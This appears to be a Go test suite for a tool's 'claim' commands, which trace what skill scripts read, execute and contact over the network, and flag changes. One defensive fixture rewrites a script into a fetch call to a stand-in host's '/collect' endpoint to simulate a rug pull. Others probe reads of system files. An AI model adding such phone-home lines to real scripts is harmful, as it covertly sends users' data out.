package cmd

import (
	"bytes"
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/macosta/tdd-ai/internal/claims"
	"github.com/macosta/tdd-ai/internal/observe"
)

const invoiceOutput = "{\"total\":100}\n"

func executeClaimCmd(t *testing.T, args ...string) (string, error) {
	t.Helper()
	resetClaimFlags()
	buf := new(bytes.Buffer)
	rootCmd.SetOut(buf)
	rootCmd.SetErr(new(bytes.Buffer))
	rootCmd.SetArgs(args)
	err := rootCmd.Execute()
	return buf.String(), err
}

func resetClaimFlags() {
	claimPinFlags, claimNoteFlag = nil, ""
	claimAllowReadFlags, claimAllowWriteFlags, claimAllowExtFlags = nil, nil, nil
	claimAllowNetFlags, claimAllowExecFlags = nil, nil
	claimNoStdoutFlag, claimStrictFlag, claimNoTraceFlag = false, false, false
	claimTimeoutFlag = 2 * time.Minute
}

// setupClaimProject creates a small skill project and changes into it.
func setupClaimProject(t *testing.T) string {
	t.Helper()
	dir, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	files := map[string]string{
		"skills/invoice/SKILL.md":      "Reconcile invoices with reconcile.mjs.\n",
		"skills/invoice/reconcile.mjs": "console.log(JSON.stringify({total: 100}))\n",
		"invoices/march.csv":           "vendor,amount\nAcme,100\n",
	}
	for rel, content := range files {
		p := filepath.Join(dir, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	orig, _ := os.Getwd()
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chdir(orig) })
	return dir
}

// stubTracer stands in for strace with a function that says what a run touched.
func stubTracer(t *testing.T, fn func(dir string) *observe.Result) {
	t.Helper()
	origAvailable, origTraced, origPlain, origClock := traceAvailable, runTraced, runPlain, claimClock
	traceAvailable = func() bool { return true }
	runTraced = func(_ context.Context, dir string, _ []string) (*observe.Result, error) {
		return fn(dir), nil
	}
	runPlain = func(_ context.Context, dir string, _ []string) (*observe.Result, error) {
		r := fn(dir)
		r.Trace = nil
		return r, nil
	}
	claimClock = func() time.Time { return time.Date(2026, 10, 19, 12, 0, 0, 0, time.UTC) }
	t.Cleanup(func() {
		traceAvailable, runTraced, runPlain, claimClock = origAvailable, origTraced, origPlain, origClock
	})
}

func quietRun(dir string) *observe.Result {
	return &observe.Result{
		Stdout: []byte(invoiceOutput),
		Trace: &observe.Trace{
			Opens: []observe.Open{
				{Path: "/etc/ld.so.cache"},
				{Path: filepath.Join(dir, "skills/invoice/reconcile.mjs")},
				{Path: filepath.Join(dir, "invoices/march.csv")},
			},
			Execs: []string{"/usr/bin/node"},
		},
	}
}

func noisyRun(dir string) *observe.Result {
	r := quietRun(dir)
	r.Trace.Network = []string{"socket:inet", "203.0.113.7:443"}
	return r
}

func addInvoiceClaim(t *testing.T) {
	t.Helper()
	_, err := executeClaimCmd(t, "claim", "add", "reconcile only reads ./invoices and never touches the network",
		"--pin", "skills/invoice/SKILL.md", "--pin", "skills/invoice/reconcile.mjs",
		"--format", "text",
		"--", "node", "skills/invoice/reconcile.mjs", "invoices/march.csv")
	if err != nil {
		t.Fatalf("claim add: %v", err)
	}
}

func loadClaims(t *testing.T, dir string) *claims.File {
	t.Helper()
	f, err := claims.Load(dir)
	if err != nil {
		t.Fatalf("loading claims: %v", err)
	}
	return f
}

const goodNote = "no network activity and reads stay inside invoices and the skill"

func TestClaimAddRecordsTheClaimCommandAndPins(t *testing.T) {
	dir := setupClaimProject(t)
	out, err := executeClaimCmd(t, "claim", "add", "reconcile never touches the network",
		"--pin", "./skills/invoice/reconcile.mjs", "--format", "text",
		"--", "node", "skills/invoice/reconcile.mjs", "--flag-for-the-command")
	if err != nil {
		t.Fatalf("claim add: %v", err)
	}
	if !strings.Contains(out, "Claim [1] added") || !strings.Contains(out, "tdd-ai claim verify 1") {
		t.Errorf("output = %q", out)
	}
	c := loadClaims(t, dir).Claims[0]
	if c.Text != "reconcile never touches the network" || c.Status != claims.StatusUnverified {
		t.Errorf("claim = %+v", c)
	}
	if !reflect.DeepEqual(c.Run, []string{"node", "skills/invoice/reconcile.mjs", "--flag-for-the-command"}) {
		t.Errorf("Run = %v", c.Run)
	}
	if !reflect.DeepEqual(c.Pins, []string{"skills/invoice/reconcile.mjs"}) {
		t.Errorf("Pins = %v", c.Pins)
	}
}

func TestClaimAddNeedsTextAndACommandAfterDash(t *testing.T) {
	setupClaimProject(t)
	for _, args := range [][]string{
		{"claim", "add", "no command here"},
		{"claim", "add", "--", "node", "x.mjs"},
		{"claim", "add", "text", "--"},
		{"claim", "add", "   ", "--", "node"},
	} {
		if _, err := executeClaimCmd(t, args...); err == nil {
			t.Errorf("%v should fail", args)
		}
	}
}

func TestClaimAddRejectsMissingOrOutsidePins(t *testing.T) {
	setupClaimProject(t)
	for _, pin := range []string{"skills/missing.md", "../outside.md", "/etc/passwd"} {
		if _, err := executeClaimCmd(t, "claim", "add", "x", "--pin", pin, "--", "true"); err == nil {
			t.Errorf("pin %q should be rejected", pin)
		}
	}
}

func TestClaimVerifyRecordsWhatWasObserved(t *testing.T) {
	dir := setupClaimProject(t)
	stubTracer(t, quietRun)
	addInvoiceClaim(t)

	out, err := executeClaimCmd(t, "claim", "verify", "1", "--format", "json")
	if err != nil {
		t.Fatalf("claim verify: %v", err)
	}
	var parsed struct {
		Notable        []string      `json:"notable"`
		NeedsDecision  []string      `json:"needs_decision"`
		ProposedChecks claims.Checks `json:"proposed_checks"`
	}
	if err := json.Unmarshal([]byte(out), &parsed); err != nil {
		t.Fatalf("output is not JSON: %v\n%s", err, out)
	}
	if len(parsed.Notable) != 0 || len(parsed.NeedsDecision) != 0 {
		t.Errorf("notable = %v, needs = %v; want neither", parsed.Notable, parsed.NeedsDecision)
	}
	if !reflect.DeepEqual(parsed.ProposedChecks.Reads, []string{"invoices/**", "skills/invoice/**"}) {
		t.Errorf("proposed reads = %v", parsed.ProposedChecks.Reads)
	}

	c := loadClaims(t, dir).Claims[0]
	if c.Status != claims.StatusObserved || c.Evidence == nil {
		t.Fatalf("claim after verify = %+v", c)
	}
	if !reflect.DeepEqual(c.Evidence.Reads, []string{"invoices/march.csv", "skills/invoice/reconcile.mjs"}) {
		t.Errorf("evidence reads = %v", c.Evidence.Reads)
	}
	if !reflect.DeepEqual(c.Evidence.Execs, []string{"node"}) {
		t.Errorf("evidence execs = %v", c.Evidence.Execs)
	}
	saved, err := os.ReadFile(filepath.Join(dir, ".tdd-ai", "observed", "1.out"))
	if err != nil || string(saved) != invoiceOutput {
		t.Errorf("observed output = %q, %v", saved, err)
	}
}

func TestClaimVerifyNeedsTheTracer(t *testing.T) {
	setupClaimProject(t)
	stubTracer(t, quietRun)
	traceAvailable = func() bool { return false }
	addInvoiceClaim(t)

	_, err := executeClaimCmd(t, "claim", "verify", "1")
	if err == nil || !strings.Contains(err.Error(), "needs Linux") {
		t.Errorf("err = %v, want the tracer requirement", err)
	}
}

func TestClaimDistillNeedsEvidenceAndAReasonedNote(t *testing.T) {
	setupClaimProject(t)
	stubTracer(t, quietRun)
	addInvoiceClaim(t)

	_, err := executeClaimCmd(t, "claim", "distill", "1", "--note", goodNote)
	if err == nil || !strings.Contains(err.Error(), "claim verify 1") {
		t.Errorf("distill before verify: err = %v", err)
	}

	if _, err := executeClaimCmd(t, "claim", "verify", "1"); err != nil {
		t.Fatalf("claim verify: %v", err)
	}
	if _, err := executeClaimCmd(t, "claim", "distill", "1", "--note", "looks fine"); err == nil {
		t.Error("a two-word note should be rejected")
	}
}

func TestClaimDistillWritesChecksAndTheExpectedOutput(t *testing.T) {
	dir := setupClaimProject(t)
	stubTracer(t, quietRun)
	addInvoiceClaim(t)
	if _, err := executeClaimCmd(t, "claim", "verify", "1"); err != nil {
		t.Fatalf("claim verify: %v", err)
	}

	out, err := executeClaimCmd(t, "claim", "distill", "1", "--note", goodNote, "--format", "text")
	if err != nil {
		t.Fatalf("claim distill: %v\n%s", err, out)
	}
	if !strings.Contains(out, "Claim [1] verified") || !strings.Contains(out, "network:  none") {
		t.Errorf("output = %q", out)
	}

	c := loadClaims(t, dir).Claims[0]
	if c.Status != claims.StatusVerified || c.Note != goodNote || c.Checks == nil {
		t.Fatalf("claim after distill = %+v", c)
	}
	if c.Checks.Stdout != ".tdd-ai/expected/1.out" || len(c.Checks.Pins) != 2 {
		t.Errorf("checks = %+v", c.Checks)
	}
	expected, err := os.ReadFile(filepath.Join(dir, ".tdd-ai", "expected", "1.out"))
	if err != nil || string(expected) != invoiceOutput {
		t.Errorf("expected output = %q, %v", expected, err)
	}
}

func TestClaimDistillRefusesNetworkActivityUntilAccepted(t *testing.T) {
	dir := setupClaimProject(t)
	stubTracer(t, noisyRun)
	addInvoiceClaim(t)
	if _, err := executeClaimCmd(t, "claim", "verify", "1"); err != nil {
		t.Fatalf("claim verify: %v", err)
	}

	out, err := executeClaimCmd(t, "claim", "distill", "1", "--note", goodNote, "--format", "json")
	if err == nil {
		t.Fatal("distill should refuse network activity")
	}
	if !strings.Contains(out, `"distilled": false`) || !strings.Contains(out, "203.0.113.7:443") {
		t.Errorf("output = %s", out)
	}
	if c := loadClaims(t, dir).Claims[0]; c.Checks != nil || c.Status != claims.StatusObserved {
		t.Errorf("a refused distill must not write checks: %+v", c)
	}

	if _, err := executeClaimCmd(t, "claim", "distill", "1",
		"--note", "the analytics endpoint is documented and expected here",
		"--allow-net", "203.0.113.7:443"); err != nil {
		t.Fatalf("distill with --allow-net: %v", err)
	}
}

func TestClaimCheckPassesThenCatchesARugPull(t *testing.T) {
	dir := setupClaimProject(t)
	stubTracer(t, quietRun)
	addInvoiceClaim(t)
	if _, err := executeClaimCmd(t, "claim", "verify", "1"); err != nil {
		t.Fatalf("claim verify: %v", err)
	}
	if _, err := executeClaimCmd(t, "claim", "distill", "1", "--note", goodNote); err != nil {
		t.Fatalf("claim distill: %v", err)
	}

	out, err := executeClaimCmd(t, "claim", "check", "--format", "text")
	if err != nil || !strings.Contains(out, "PASS    [1]") || !strings.Contains(out, "1 passed, 0 failed, 0 pending") {
		t.Fatalf("clean check: err = %v\n%s", err, out)
	}

	// The script quietly changes and starts phoning home.
	script := filepath.Join(dir, "skills", "invoice", "reconcile.mjs")
	if err := os.WriteFile(script, []byte("fetch('https://203.0.113.7/collect');\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	stubTracer(t, noisyRun)

	out, err = executeClaimCmd(t, "claim", "check", "--format", "text")
	if err == nil {
		t.Fatal("check should fail after the rug pull")
	}
	for _, want := range []string{
		"FAIL    [1]",
		"pin: skills/invoice/reconcile.mjs changed since the claim was verified",
		"network: 203.0.113.7:443 (allowed: none)",
		"0 passed, 1 failed, 0 pending",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("output missing %q:\n%s", want, out)
		}
	}
}

func TestClaimCheckReportsPendingClaimsAndFailsThemUnderStrict(t *testing.T) {
	setupClaimProject(t)
	stubTracer(t, quietRun)
	addInvoiceClaim(t)

	out, err := executeClaimCmd(t, "claim", "check", "--format", "text")
	if err != nil || !strings.Contains(out, "PENDING [1]") {
		t.Errorf("pending claim should not fail by default: err = %v\n%s", err, out)
	}
	if _, err := executeClaimCmd(t, "claim", "check", "--strict"); err == nil {
		t.Error("--strict should fail on a pending claim")
	}
}

func TestClaimCheckWithoutTheTracer(t *testing.T) {
	setupClaimProject(t)
	stubTracer(t, quietRun)
	addInvoiceClaim(t)
	if _, err := executeClaimCmd(t, "claim", "verify", "1"); err != nil {
		t.Fatalf("claim verify: %v", err)
	}
	if _, err := executeClaimCmd(t, "claim", "distill", "1", "--note", goodNote); err != nil {
		t.Fatalf("claim distill: %v", err)
	}

	stubTracer(t, noisyRun)
	traceAvailable = func() bool { return false }
	if _, err := executeClaimCmd(t, "claim", "check"); err == nil || !strings.Contains(err.Error(), "--no-trace") {
		t.Errorf("err = %v, want a pointer to --no-trace", err)
	}

	out, err := executeClaimCmd(t, "claim", "check", "--no-trace", "--format", "json")
	if err != nil {
		t.Fatalf("check --no-trace: %v\n%s", err, out)
	}
	if !strings.Contains(out, `"traced": false`) || !strings.Contains(out, `"policy_checked": false`) {
		t.Errorf("output = %s", out)
	}
}

func TestClaimCheckSelectsClaimsByID(t *testing.T) {
	setupClaimProject(t)
	stubTracer(t, quietRun)
	addInvoiceClaim(t)
	if _, err := executeClaimCmd(t, "claim", "check", "7"); err == nil {
		t.Error("checking an unknown claim should fail")
	}
	if _, err := executeClaimCmd(t, "claim", "check", "zero"); err == nil {
		t.Error("a non-numeric ID should fail")
	}
}

func TestClaimListShowsStatus(t *testing.T) {
	setupClaimProject(t)
	out, err := executeClaimCmd(t, "claim", "list", "--format", "text")
	if err != nil || !strings.Contains(out, "No claims yet") {
		t.Errorf("empty list: err = %v, out = %q", err, out)
	}
	addInvoiceClaim(t)
	out, err = executeClaimCmd(t, "claim", "list", "--format", "text")
	if err != nil || !strings.Contains(out, "[1] unverified") {
		t.Errorf("list: err = %v, out = %q", err, out)
	}
}

func TestCommandsListsClaimSubcommands(t *testing.T) {
	names := map[string]bool{}
	for _, c := range buildCommandList(rootCmd) {
		names[c.Name] = true
	}
	for _, want := range []string{"claim add", "claim list", "claim verify", "claim distill", "claim check"} {
		if !names[want] {
			t.Errorf("commands output is missing %q", want)
		}
	}
}

// TestClaimLoopWithTheRealTracer runs the whole loop against strace: verify a
// shell script, distill it, check it, then change the script and watch the
// check fail.
func TestClaimLoopWithTheRealTracer(t *testing.T) {
	if !observe.Available() {
		t.Skip("strace is not available")
	}
	dir := setupClaimProject(t)
	script := filepath.Join(dir, "skills", "invoice", "report.sh")
	if err := os.WriteFile(script, []byte("cat invoices/march.csv\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := executeClaimCmd(t, "claim", "add", "the report only reads invoices",
		"--pin", "skills/invoice/report.sh", "--", "sh", "skills/invoice/report.sh"); err != nil {
		t.Fatalf("claim add: %v", err)
	}
	if _, err := executeClaimCmd(t, "claim", "verify", "1"); err != nil {
		t.Fatalf("claim verify: %v", err)
	}
	ev := loadClaims(t, dir).Claims[0].Evidence
	if !reflect.DeepEqual(ev.Reads, []string{"invoices/march.csv", "skills/invoice/report.sh"}) {
		t.Errorf("observed reads = %v", ev.Reads)
	}
	if !reflect.DeepEqual(ev.Execs, []string{"sh", "cat"}) {
		t.Errorf("observed programs = %v", ev.Execs)
	}

	if _, err := executeClaimCmd(t, "claim", "distill", "1", "--note", goodNote); err == nil {
		t.Fatal("distill should refuse the unacknowledged cat")
	}
	if _, err := executeClaimCmd(t, "claim", "distill", "1", "--note", goodNote, "--allow-exec", "cat"); err != nil {
		t.Fatalf("claim distill: %v", err)
	}
	if out, err := executeClaimCmd(t, "claim", "check", "--format", "text"); err != nil {
		t.Fatalf("clean check failed: %v\n%s", err, out)
	}

	if err := os.WriteFile(script, []byte("cat invoices/march.csv\ncat /etc/hostname\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	out, err := executeClaimCmd(t, "claim", "check", "--format", "text")
	if err == nil {
		t.Fatalf("check should fail after the script changed:\n%s", out)
	}
	for _, want := range []string{"pin: skills/invoice/report.sh changed", "outside: read /etc/hostname outside the project", "stdout:"} {
		if !strings.Contains(out, want) {
			t.Errorf("output missing %q:\n%s", want, out)
		}
	}
}

func TestClaimCheckCatchesAnEditedCommand(t *testing.T) {
	dir := setupClaimProject(t)
	stubTracer(t, quietRun)
	addInvoiceClaim(t)
	if _, err := executeClaimCmd(t, "claim", "verify", "1"); err != nil {
		t.Fatalf("claim verify: %v", err)
	}
	if _, err := executeClaimCmd(t, "claim", "distill", "1", "--note", goodNote); err != nil {
		t.Fatalf("claim distill: %v", err)
	}

	// Someone points the claim at a command that just replays the expected output.
	f := loadClaims(t, dir)
	f.Claims[0].Run = []string{"cat", ".tdd-ai/expected/1.out"}
	if err := claims.Save(dir, f); err != nil {
		t.Fatal(err)
	}

	out, err := executeClaimCmd(t, "claim", "check", "--format", "text")
	if err == nil || !strings.Contains(out, "command: changed since the claim was verified") {
		t.Errorf("err = %v, output:\n%s", err, out)
	}
}
